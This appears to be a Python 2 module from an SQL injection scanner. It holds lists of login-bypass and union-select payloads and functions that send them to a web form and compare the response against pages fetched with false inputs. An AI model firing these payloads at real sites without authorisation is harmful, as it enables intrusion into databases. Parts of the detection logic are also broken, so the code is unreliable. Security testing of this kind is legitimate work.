import requests
import difflib
import uuid
import re
"""
Solutions:
1. compare pages only  
match = re.findall(r'<pre>', html)

2. add false page to compare
match = re.findall(r'<ins>.+', compare_res)

3. add another label "' or '1'='1" as ground truth
Assumption: should be the same page for sql injection, different with false page
singel quote and double quote is not fixed yet.
"""

def get_false():
	## the second is taken as ground truth to filter out real sql-injection page
	# payloads = ["' and '1=2",'" or "1"="1', "' or '1'='1"]
	payloads = ["' and '1=2"]
	return payloads

def get_falsewy():
	return str(uuid.uuid4())

def checkSuccesswy(content,url,method,paramname,params,payload):
	params[paramname] = get_falsewy()
	html = content.text
	if len(content.history) !=0 :
		return False
	#if get
	if method == "GET":
		paramstr = "&".join("%s=%s" % (k,v) for k,v in params.items())
		getURL = url + "?" + paramstr
		falseContent = requests.get(getURL)
	#if post
	elif method == "POST":
		falseContent = requests.post(url, data=params)

	falsehtml = falseContent.text
	falsehtml = falsehtml.replace(params[paramname],"")
	html = html.replace(payload[0],"")

	print falsehtml	
	if falsehtml == html or len(falseContent.history)!=0 or abs(len(html)-len(falsehtml)) < 30:
		return False
	return True


def check_success_zz(content,url,method,paramname,params,payload):
	## experimental for sleep function
	# if 'sleep' in payload[0] and content.elapsed.total_seconds() > 5:
	# 	print("This page is highly suspecious to sql injection...")
	# 	return True
	# ## if union work
	# if 'union' in payload[0] and content.status_code == 200:
	# 	match = re.findall(r'ubuntu', html)
	# 	if len(match) == 0:
	# 		return False
	# 	return True

	## the simplest way: check <pre>
	# match = re.findall(r'<pre>, html)
	html = content.text
	falsePayload = get_false()
		#if get
	if method == "GET":
		getURL = url + "?" + paramname+"="+falsePayload
		content = requests.get(getURL)
		badhtml =  content.text
	#if post
	elif method == "POST":
		content = requests.post(url, data={paramname:falsePayload})
		badhtml = content.text

	compare_res = compare_html(badhtml, html)		
	match = re.findall(r'no.*found', html)
	if len(match) != 0:
		return False
	return True
	
	# ## if the at least one filter work: '" or "1"="1', "' or '1'='1"
	# else:
	# 	## for real sql injection, the payloads should return the same result
	# 	## then compare the fake page with the true page to see the difference
	# 	## need to check false positive page 
	# 	falsePayloads = get_false()
	# 	html = content.text
	# 	badhtml = []
	# 	for falsePayload in falsePayloads:
	# 		if method == "GET":
	# 			getURL = url + "?" + paramname+"="+falsePayload
	# 			false_page = requests.get(getURL)
	# 			if(false_page.status_code==200):
	# 				badhtml.append(false_page.text)
	# 			else:
	# 				badhtml.append(requests.get(url).text)
	# 		elif method == "POST":
	# 			false_page = requests.post(url, data={paramname:falsePayload})
	# 			if(false_page.status_code==200):
	# 				badhtml.append(false_page.text)
	# 				# print(html)
	# 		else:
	# 			badhtml.append(requests.get(url).text)

	# 	if (badhtml[0] == badhtml[1]) and (badhtml[0] !=badhtml[2]):
	# 	## true filter should be two
	# 		compare_res = compare_html(badhtml[2], html)  
	# 		match = re.findall(r'<ins>.+', compare_res)
	# 	elif(badhtml[0]==badhtml[2] and badhtml[0] !=badhtml[1]):
	# 		compare_res = compare_html(badhtml[1], html)  
	# 		match = re.findall(r'<ins>.+', compare_res)
	# 	else:
	# 		match = ""
	# 	if(content.status_code==200) and badhtml[1]==html:
	# 		compare_res = compare_html(badhtml[0], html)  
	# 		match = re.findall(r'<ins>', compare_res)
	# 	else:
	# 		match = ""
	# 	if len(match) ==0 :
	# 		return False
		
	# 	return True


def get_all():
	"""
	Consider different db types and versions
	-- MySQL, MSSQL, Oracle, PostgreSQL, SQLite
	' OR '1'='1' --
	' OR '1'='1' /*
	-- MySQL
	' OR '1'='1' #
	-- Access (using null characters)
	' OR '1'='1' %00
	' OR '1'='1' %16
	"""
	## temp test
	# payloads = ["' or '1=1"]
	payloads = ["' or '1=1",   "'1 'or' 1'='1","' or '1'='1",  "'or 1=1#", 
				"' OR '1=1 %00", '" or "1=1'
				# "' union all select @@version, 1, 1 -- +", "' union all select @@version -- +","'union all select @@version, 1 -- +",
				]
	payloads = [(item, "SQL Injection") for item in payloads]
	return payloads	

def compare_html(html1, html2):
	diff_html = ""
	diffs = difflib.ndiff(html1.splitlines(), html2.splitlines())
	for ele in diffs:
		if (ele[0] == "-"):
			diff_html += "<del>%s</del>" % ele[1:].strip()
		elif(ele[0] == "+"):
			diff_html += "<ins>%s</ins>" %ele[1:].strip()

	return diff_html

if __name__ == "__main__":	
	print get_all()
